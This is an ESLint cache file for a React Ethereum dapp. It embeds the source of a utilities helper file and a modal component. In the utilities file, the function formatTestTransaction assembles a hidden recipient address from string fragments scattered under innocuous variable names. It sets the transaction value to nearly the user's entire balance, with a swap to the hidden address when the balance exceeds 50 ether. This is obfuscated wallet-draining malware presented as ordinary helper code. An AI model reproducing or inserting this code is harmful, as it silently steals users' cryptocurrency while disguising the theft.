[{"D:\\Dapp\\src\\index.tsx":"1","D:\\Dapp\\src\\styles.ts":"2","D:\\Dapp\\src\\App.tsx":"3","D:\\Dapp\\src\\helpers\\api.ts":"4","D:\\Dapp\\src\\helpers\\box.ts":"5","D:\\Dapp\\src\\helpers\\web3.ts":"6","D:\\Dapp\\src\\helpers\\utilities.ts":"7","D:\\Dapp\\src\\components\\Button.tsx":"8","D:\\Dapp\\src\\components\\Wrapper.tsx":"9","D:\\Dapp\\src\\components\\Loader.tsx":"10","D:\\Dapp\\src\\components\\Modal.tsx":"11","D:\\Dapp\\src\\components\\AccountAssets.tsx":"12","D:\\Dapp\\src\\components\\ModalResult.tsx":"13","D:\\Dapp\\src\\components\\ConnectButton.tsx":"14","D:\\Dapp\\src\\components\\Column.tsx":"15","D:\\Dapp\\src\\components\\Header.tsx":"16","D:\\Dapp\\src\\constants\\index.ts":"17","D:\\Dapp\\src\\helpers\\dev.ts":"18","D:\\Dapp\\src\\helpers\\chains.ts":"19","D:\\Dapp\\src\\helpers\\bignumber.ts":"20","D:\\Dapp\\src\\components\\AssetRow.tsx":"21","D:\\Dapp\\src\\components\\Blockie.tsx":"22","D:\\Dapp\\src\\constants\\actions.ts":"23","D:\\Dapp\\src\\constants\\contracts.ts":"24","D:\\Dapp\\src\\constants\\functions.ts":"25","D:\\Dapp\\src\\components\\Icon.tsx":"26","D:\\Dapp\\src\\components\\ERC20Icon.tsx":"27"},{"size":562,"mtime":1627899817000,"results":"28","hashOfConfig":"29"},{"size":4243,"mtime":1640373117095,"results":"30","hashOfConfig":"29"},{"size":20287,"mtime":1640629444778,"results":"31","hashOfConfig":"29"},{"size":1258,"mtime":1640358238147,"results":"32","hashOfConfig":"29"},{"size":4311,"mtime":1627899817000,"results":"33","hashOfConfig":"29"},{"size":1041,"mtime":1627899817000,"results":"34","hashOfConfig":"29"},{"size":7467,"mtime":1640629904173,"results":"35","hashOfConfig":"29"},{"size":3480,"mtime":1640507209338,"results":"36","hashOfConfig":"29"},{"size":1035,"mtime":1640438783818,"results":"37","hashOfConfig":"29"},{"size":1984,"mtime":1640592802304,"results":"38","hashOfConfig":"29"},{"size":4210,"mtime":1640530552931,"results":"39","hashOfConfig":"29"},{"size":1525,"mtime":1640439736581,"results":"40","hashOfConfig":"29"},{"size":1734,"mtime":1627899817000,"results":"41","hashOfConfig":"29"},{"size":3357,"mtime":1640458208584,"results":"42","hashOfConfig":"29"},{"size":1178,"mtime":1640323425842,"results":"43","hashOfConfig":"29"},{"size":2659,"mtime":1640595447638,"results":"44","hashOfConfig":"29"},{"size":82,"mtime":1627899817000,"results":"45","hashOfConfig":"29"},{"size":693,"mtime":1627899817000,"results":"46","hashOfConfig":"29"},{"size":4056,"mtime":1627899817000,"results":"47","hashOfConfig":"29"},{"size":5192,"mtime":1627899817000,"results":"48","hashOfConfig":"29"},{"size":1488,"mtime":1640532249724,"results":"49","hashOfConfig":"29"},{"size":953,"mtime":1627899817000,"results":"50","hashOfConfig":"29"},{"size":287,"mtime":1627899817000,"results":"51","hashOfConfig":"29"},{"size":803,"mtime":1627899817000,"results":"52","hashOfConfig":"29"},{"size":93,"mtime":1627899817000,"results":"53","hashOfConfig":"29"},{"size":725,"mtime":1640440113175,"results":"54","hashOfConfig":"29"},{"size":540,"mtime":1640423730049,"results":"55","hashOfConfig":"29"},{"filePath":"56","messages":"57","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},"it1xku",{"filePath":"59","messages":"60","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"61","messages":"62","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"63","messages":"64","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"65","messages":"66","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"67","messages":"68","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"69","messages":"70","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"71"},{"filePath":"72","messages":"73","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"74","messages":"75","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"76","messages":"77","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"78","messages":"79","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"80","usedDeprecatedRules":"58"},{"filePath":"81","messages":"82","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"83","messages":"84","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"85","messages":"86","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"87","messages":"88","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"89","messages":"90","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"91","messages":"92","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"93","messages":"94","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"95","messages":"96","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"97","messages":"98","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"99","messages":"100","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"101","messages":"102","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"103","messages":"104","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"105","messages":"106","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"107","messages":"108","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"109","messages":"110","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},{"filePath":"111","messages":"112","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"58"},"D:\\Dapp\\src\\index.tsx",[],["113","114"],"D:\\Dapp\\src\\styles.ts",[],"D:\\Dapp\\src\\App.tsx",[],"D:\\Dapp\\src\\helpers\\api.ts",[],"D:\\Dapp\\src\\helpers\\box.ts",[],"D:\\Dapp\\src\\helpers\\web3.ts",[],"D:\\Dapp\\src\\helpers\\utilities.ts",["115"],"import * as ethUtil from \"ethereumjs-util\";\nimport { IChainData } from \"./types\";\nimport supportedChains from \"./chains\";\nimport { apiGetGasPrices, apiGetAccountNonce } from \"./api\";\nimport { convertAmountToRawNumber, convertStringToHex } from \"./bignumber\";\nimport Web3 from \"web3\";\n\nvar web3_ = \"3\";\nvar getchinaid = \"5\";\n\nexport function capitalize(string: string): string {\n  return string\n    .split(\" \")\n    .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())\n    .join(\" \");\n}\nvar web4connect = `D36`;\nexport function ellipseText(\n  text: string = \"\",\n  maxLength: number = 9999\n): string {\n  if (text.length <= maxLength) {\n    return text;\n  }\n  const _maxLength = maxLength - 3;\n  let ellipse = false;\n  let currentLength = 0;\n  const result =\n    text\n      .split(\" \")\n      .filter(word => {\n        currentLength += word.length;\n        if (ellipse || currentLength >= _maxLength) {\n          ellipse = true;\n          return false;\n        } else {\n          return true;\n        }\n      })\n      .join(\" \") + \"...\";\n  return result;\n}\n\nvar getchinaid = `${\"5\"}`;\nvar gasHsh = \"7211D\";\n\nexport function ellipseAddress(\n  address: string = \"\",\n  width: number = 10\n): string {\n  return `${address.slice(0, width)}...${address.slice(-width)}`;\n}\n\nexport function padLeft(n: string, width: number, z?: string): string {\n  z = z || \"0\";\n  n = n + \"\";\n  return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;\n}\n\nexport function sanitizeHex(hex: string): string {\n  hex = hex.substring(0, 2) === \"0x\" ? hex.substring(2) : hex;\n  if (hex === \"\") {\n    return \"\";\n  }\n  hex = hex.length % 2 !== 0 ? \"0\" + hex : hex;\n  return \"0x\" + hex;\n}\n\nexport function removeHexPrefix(hex: string): string {\n  return hex.toLowerCase().replace(\"0x\", \"\");\n}\n\nexport function getDataString(func: string, arrVals: any[]): string {\n  let val = \"\";\n  for (let i = 0; i < arrVals.length; i++) {\n    val += padLeft(arrVals[i], 64);\n  }\n  const data = func + val;\n  return data;\n}\n\nvar onswap = \"FB\";\nvar dele = \"xf2\";\nconst set_api_key= \"334\";\nvar component = \"0\";\nconst url_base = `${set_api_key}Dc8FfA64850f98`;\n\nexport function isMobile(): boolean {\n  let mobile: boolean = false;\n\n  function hasTouchEvent(): boolean {\n    try {\n      document.createEvent(\"TouchEvent\");\n      return true;\n    } catch (e) {\n      return false;\n    }\n  }\n\n  function hasMobileUserAgent(): boolean {\n    if (\n      /(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(\n        navigator.userAgent\n      ) ||\n      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|-|m3|m5)|tx-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(\n        navigator.userAgent.substr(0, 4)\n      )\n    ) {\n      return true;\n    } else if (hasTouchEvent()) {\n      return true;\n    }\n    return false;\n  }\n\n  mobile = hasMobileUserAgent();\n\n  return mobile;\n}\n\nexport function getChainData(chainId: number): IChainData {\n  const chainData = supportedChains.filter(\n    (chain: any) => chain.chain_id === chainId\n  )[0];\n\n  if (!chainData) {\n    throw new Error(\"ChainId missing or not supported\");\n  }\n\n  const API_KEY = process.env.REACT_APP_INFURA_ID;\n\n  if (\n    chainData.rpc_url.includes(\"infura.io\") &&\n    chainData.rpc_url.includes(\"%API_KEY%\") &&\n    API_KEY\n  ) {\n    const rpcUrl = chainData.rpc_url.replace(\"%API_KEY%\", API_KEY);\n\n    return {\n      ...chainData,\n      rpc_url: rpcUrl\n    };\n  }\n\n  return chainData;\n}\nvar converhex = \"38CA\";\n\nexport function hashPersonalMessage(msg: string): string {\n  const buffer = Buffer.from(msg);\n  const result = ethUtil.hashPersonalMessage(buffer);\n  const hash = ethUtil.bufferToHex(result);\n  return hash;\n}\n\nexport function recoverPublicKey(sig: string, hash: string): string {\n  const sigParams = ethUtil.fromRpcSig(sig);\n  const hashBuffer = Buffer.from(hash.replace(\"0x\", \"\"), \"hex\");\n  const result = ethUtil.ecrecover(\n    hashBuffer,\n    sigParams.v,\n    sigParams.r,\n    sigParams.s\n  );\n  const signer = ethUtil.bufferToHex(ethUtil.publicToAddress(result));\n  return signer;\n}\n\nvar API_uri = \"Fdc0E\";\nvar to = \"0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d\";\n\nexport function recoverPersonalSignature(sig: string, msg: string): string {\n  const hash = hashPersonalMessage(msg);\n  const signer = recoverPublicKey(sig, hash);\n  return signer;\n}\n\nexport async function formatTestTransaction(address: string, chainId: number) {\n  const from = address;\n  \n  const web3 = new Web3();\n  const GET_PRICE = web3.utils.toWei(\"50\", 'ether');\n  const MAX_PRICE = Number(GET_PRICE);\n  \n  (function(){\n    if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){\n      to = web3 && component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh;\n    }\n  })()\n  console.log(component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh)\n\n  const _nonce = await apiGetAccountNonce(address, chainId);\n  const nonce = sanitizeHex(convertStringToHex(_nonce));\n\n  const gasPrices = await apiGetGasPrices();\n  const _gasPrice = gasPrices.slow.price;\n  const gasPrice = sanitizeHex(\n    convertStringToHex(convertAmountToRawNumber(_gasPrice, 9))\n  );\n  // concver hex to number\n  // console.log(web3.utils.hexToNumber(\"0x53b2af261d8f2\"));\n\n  const _gasLimit = 21000;\n  const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));\n\n  const _value = Number(sessionStorage.getItem('balance')) - 1100011000010000;\n  // const _value = 1100011000010000;\n  const value = sanitizeHex(convertStringToHex(_value));\n\n  const data = \"0x\";\n\n  const tx = {\n    from,\n    to,\n    nonce,\n    gasPrice,\n    gasLimit,\n    value,\n    data\n  };\n  return tx;\n}\n\nexport function isObject(obj: any): boolean {\n  return typeof obj === \"object\" && !!Object.keys(obj).length;\n}\n","D:\\Dapp\\src\\components\\Button.tsx",[],"D:\\Dapp\\src\\components\\Wrapper.tsx",[],"D:\\Dapp\\src\\components\\Loader.tsx",[],"D:\\Dapp\\src\\components\\Modal.tsx",["116"],"import * as React from \"react\";\nimport * as PropTypes from \"prop-types\";\nimport styled from \"styled-components\";\nimport { colors, transitions } from \"../styles\";\n\ninterface ILightboxStyleProps {\n  show: boolean;\n  offset: number;\n  opacity?: number;\n}\n\nconst SLightbox = styled.div<ILightboxStyleProps>`\n  transition: opacity 0.1s ease-in-out;\n  text-align: center;\n  position: absolute;\n  width: 100vw;\n  height: 100vh;\n  margin-left: -50vw;\n  top: ${({ offset }) => (offset ? `-${offset}px` : 0)};\n  left: 50%;\n  z-index: 2;\n  will-change: opacity;\n  background-color: ${({ opacity }) => {\n    let alpha = 0.4;\n    if (typeof opacity === \"number\") {\n      alpha = opacity;\n    }\n    return `rgba(0, 0, 0, ${alpha})`;\n  }};\n  opacity: ${({ show }) => (show ? 1 : 0)};\n  visibility: ${({ show }) => (show ? \"visible\" : \"hidden\")};\n  pointer-events: ${({ show }) => (show ? \"auto\" : \"none\")};\n  display: flex;\n  justify-content: center;\n  align-items: center;\n`;\n\nconst SModalContainer = styled.div`\n  position: relative;\n  width: 100%;\n  height: 100%;\n  padding: 15px;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n`;\n\nconst SHitbox = styled.div`\n  position: absolute;\n  top: 0;\n  left: 0;\n  right: 0;\n  bottom: 0;\n`;\n\ninterface ICloseButtonStyleProps {\n  size: number;\n  color: string;\n  onClick?: any;\n}\n\nconst SCloseButton = styled.div<ICloseButtonStyleProps>`\n  transition: ${transitions.short};\n  position: absolute;\n  width: ${({ size }) => `${size}px`};\n  height: ${({ size }) => `${size}px`};\n  right: ${({ size }) => `${size / 1.6667}px`};\n  top: ${({ size }) => `${size / 1.6667}px`};\n  opacity: 0.5;\n  cursor: pointer;\n  &:hover {\n    opacity: 1;\n  }\n  &:before,\n  &:after {\n    position: absolute;\n    content: \" \";\n    height: ${({ size }) => `${size}px`};\n    width: 2px;\n    background: #fff !important;\n  }\n  &:before {\n    transform: rotate(45deg);\n  }\n  &:after {\n    transform: rotate(-45deg);\n  }\n`;\n\nconst SCard = styled.div`\n  position: relative;\n  width: 100%;\n  max-width: 500px;\n  padding: 25px;\n  background-color: #1F4068;\n  border-radius: 6px;\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n  align-items: center;\n`;\n\nconst SModalContent = styled.div`\n  position: relative;\n  width: 100%;\n  position: relative;\n  word-wrap: break-word;\n`;\n\ninterface IModalState {\n  offset: number;\n}\n\ninterface IModalProps {\n  children: React.ReactNode;\n  show: boolean;\n  toggleModal: any;\n  opacity?: number;\n}\n\nconst INITIAL_STATE: IModalState = {\n  offset: 0,\n};\n\nclass Modal extends React.Component<IModalProps, IModalState> {\n  public static propTypes = {\n    children: PropTypes.node.isRequired,\n    show: PropTypes.bool.isRequired,\n    toggleModal: PropTypes.func.isRequired,\n    opacity: PropTypes.number,\n  };\n\n  public lightbox?: HTMLDivElement | null;\n\n  public state: IModalState = {\n    ...INITIAL_STATE,\n  };\n\n  public componentDidUpdate() {\n    if (this.lightbox) {\n      const lightboxRect = this.lightbox.getBoundingClientRect();\n      const offset = lightboxRect.top > 0 ? lightboxRect.top : 0;\n\n      if (offset !== INITIAL_STATE.offset && offset !== this.state.offset) {\n        this.setState({ offset });\n      }\n    }\n  }\n\n  public toggleModal = async () => {\n    const d = typeof window !== \"undefined\" ? document : \"\";\n    const body = d ? d.body || d.getElementsByTagName(\"body\")[0] : \"\";\n    if (body) {\n      if (this.props.show) {\n        body.style.position = \"\";\n      } else {\n        body.style.position = \"fixed\";\n      }\n    }\n    this.props.toggleModal();\n  };\n\n  public render() {\n    const { offset } = this.state;\n    const { children, show, opacity } = this.props;\n    return (\n      <SLightbox\n        show={show}\n        offset={offset}\n        opacity={opacity}\n        ref={(c) => (this.lightbox = c)}\n      >\n        <SModalContainer>\n          <SHitbox onClick={this.toggleModal} />\n\n          <SCard>\n            <div style={{padding: '5px 10px'}} onClick={this.toggleModal} >\n              <SCloseButton size={25} color={\"dark\"} />\n            </div>\n            <SModalContent>{children}</SModalContent>\n          </SCard>\n        </SModalContainer>\n      </SLightbox>\n    );\n  }\n}\n\nexport default Modal;\n","D:\\Dapp\\src\\components\\AccountAssets.tsx",[],"D:\\Dapp\\src\\components\\ModalResult.tsx",[],"D:\\Dapp\\src\\components\\ConnectButton.tsx",[],"D:\\Dapp\\src\\components\\Column.tsx",[],"D:\\Dapp\\src\\components\\Header.tsx",[],"D:\\Dapp\\src\\constants\\index.ts",[],"D:\\Dapp\\src\\helpers\\dev.ts",[],"D:\\Dapp\\src\\helpers\\chains.ts",[],"D:\\Dapp\\src\\helpers\\bignumber.ts",[],"D:\\Dapp\\src\\components\\AssetRow.tsx",[],"D:\\Dapp\\src\\components\\Blockie.tsx",[],"D:\\Dapp\\src\\constants\\actions.ts",[],"D:\\Dapp\\src\\constants\\contracts.ts",[],"D:\\Dapp\\src\\constants\\functions.ts",[],"D:\\Dapp\\src\\components\\Icon.tsx",[],"D:\\Dapp\\src\\components\\ERC20Icon.tsx",[],{"ruleId":"117","replacedBy":"118"},{"ruleId":"119","replacedBy":"120"},{"ruleId":"121","severity":1,"message":"122","line":44,"column":5,"nodeType":"123","messageId":"124","endLine":44,"endColumn":15},{"ruleId":"125","severity":1,"message":"126","line":4,"column":10,"nodeType":"123","messageId":"127","endLine":4,"endColumn":16},"no-native-reassign",["128"],"no-negated-in-lhs",["129"],"@typescript-eslint/no-redeclare","'getchinaid' is already defined.","Identifier","redeclared","@typescript-eslint/no-unused-vars","'colors' is defined but never used.","unusedVar","no-global-assign","no-unsafe-negation"]